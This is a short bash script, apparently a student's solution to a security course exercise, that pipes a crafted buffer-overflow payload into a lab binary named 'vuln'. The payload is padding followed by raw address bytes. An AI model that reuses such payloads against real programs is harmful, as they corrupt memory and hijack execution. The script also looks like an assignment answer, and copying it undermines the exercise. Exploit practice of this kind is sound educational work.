#!/usr/bin/env bash
echo -en "$(python -c "print('a'*183)")$\xe4\x88\xff\x43$(python -c "print('a'*183)")$\x30\xb3\xe5\xe0aaaaa" | /task1/s1813674/vuln
